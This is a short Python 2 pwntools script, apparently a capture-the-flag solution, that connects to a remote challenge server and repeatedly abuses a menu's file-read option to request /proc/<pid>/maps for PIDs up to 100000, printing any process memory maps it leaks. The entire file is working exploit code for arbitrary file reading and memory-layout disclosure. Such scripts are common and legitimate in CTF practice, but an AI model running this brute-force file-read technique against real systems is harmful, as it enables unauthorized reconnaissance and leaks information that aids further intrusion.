from pwn import *

import sys


def dump_file(filename):
    p.recvuntil('4. exit\n> ')
    p.sendline('3')
    p.recvuntil('KEY>')
    p.sendline(filename)

p = remote('labyrinth.eatpwnnosleep.com', 10000)
g = log.progress('pid')

for pid in range(int(sys.argv[1]) if len(sys.argv) > 1 else 0, 100000):
    while True:
        try:
            dump_file('/proc/{}/maps'.format(str(pid)))
            g.status(str(pid))
            data = p.recvn(6)
            if data != 'Nope:)':
                print '[+] pid: %d' % pid
                data += p.recvuntil('1. make_labyrinth', drop=True)
                print data
            break
        except EOFError:
            p.close()
            p = remote('labyrinth.eatpwnnosleep.com', 10000)
